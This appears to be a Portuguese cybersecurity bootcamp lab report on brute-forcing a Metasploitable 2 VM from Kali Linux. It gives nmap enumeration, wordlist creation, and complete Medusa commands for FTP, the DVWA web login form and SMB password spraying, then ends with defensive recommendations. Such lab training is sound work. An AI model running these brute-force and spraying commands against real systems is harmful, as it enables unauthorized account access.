# BootcampDIO-SantanderCiberseguranca2025
Simulação de ataque brute force utilizando Kali Linux e Metasploitable 2

Kali Linux e Metasploitable 2 configurados na mesma rede (192.168.1.0/24) para se comunicarem (rodar o comando "ip a" ou "ifconfig" nas duas VMs para obter o IP de cada VM)
IP Kali Linux: 192.168.1.4
IP Metasploitable 2: 192.168.1.5

ping feito do Kali Linux para o Metasploitable 2 com o objetivo de confirmar a conexão entre as VMs 
Comando: ping -c 4 192.168.1.5 

1 etapa: enumeração de portas abertas | ferramenta usada: Nmap 7.95
Objetivo: identificar porta FTP aberta 
Comando: nmap -sV -p 21,22,80,445,139 192.168.1.5

Portas abertas: 
- 21 - serviço: FTP - versão: vsftpd 2.3.4 
- 22 - serviço: SSH - versão: OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- 80 - serviço: HTTP - versão: Apach httpd 2.2.8
- 139 - serviço: netbios-ssn - versão: Samba smbd 3.X - 4.X 
- 445 - serviço: netbios-ssn - versão: Samba smbd 3.X - 4.X 

Identificado que a porta FTP esta aberta usa-se o comando: "ftp (IP da VM Metasploitable)" para confirmar que o serviço esta ativo 

2 etapa: ataque brute force | ferramenta usada: Medusa v2.3

Criação de wordlists:
Para usernames: arquivo usernames.txt contendo as seguintes palavras: msfadmin, user, service, root, admin, test, guest, info, adm, administrator, ftp, admin123, 123admin e qwerty
Comando: echo -e 'msfadmin\nuser\nservice\nroot\nadmin\ntest\nguest\ninfo\nadm\nadministrator\nftp\nadmin123\n123admin\nqwerty' > usernames.txt 

Para senhas: arquivo pass.txt com as seguintes palavras: 123456, password, qwerty, msfadmin, admin, Welcome123, admin123, root, 123admin, pass123
Comando: echo -e '123456\npassword\nqwerty\nmsfadmin\nadmin\nWelcome123\nadmin123\nroot\n123admin\npass123' > pass.txt

Comando brute force: medusa -h 192.168.1.5 -U usernames.txt -P pass.txt -M ftp -t 10
Resultado - usuario: msfadmin | senha: msfadmin

- Brute force em formulário de login em sistema web (DVWA) -

Comando:
medusa -h 192.168.1.5 -U usernames.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 10

Resultado - usuario: admin | senha: password 

- Ataque em cadeia, enumeração smb + password spraying -

Enumeração de usuários usando Enum4Linux:
Comando: enum4linux -a 192.168.1.5 | tee enum4_output.txt 

Password spraying usando Medusa:
Comando: medusa -h 192.168.1.5 -U usernames.txt -P pass.txt -M smbnt -t 2 -T 50

Resultado - usuario: msfadmin | senha: msfadmin 

Verificando acesso ao smb:
Comando: smbclient -L //192.168.1.5 -U msfadmin 

- Vulnerabilidades: senhas fracas e iguais ao campo user
- Soluções: Implementar 2FA/MFA e recomendar ao usuário que utilize senhas fortes, bloqueio de IPs para múltiplas tentativas de logins, monitoramento de logs e segmentação da rede
- Recomendações para criação de senhas:
mínimo de 12 caracteres, utlizar letras maiúsculas (A-Z) e minúsculas (a-z), utlizar símbolos (!, @, #, $, %, &, *), evitar informações pessoais e organizacionais.





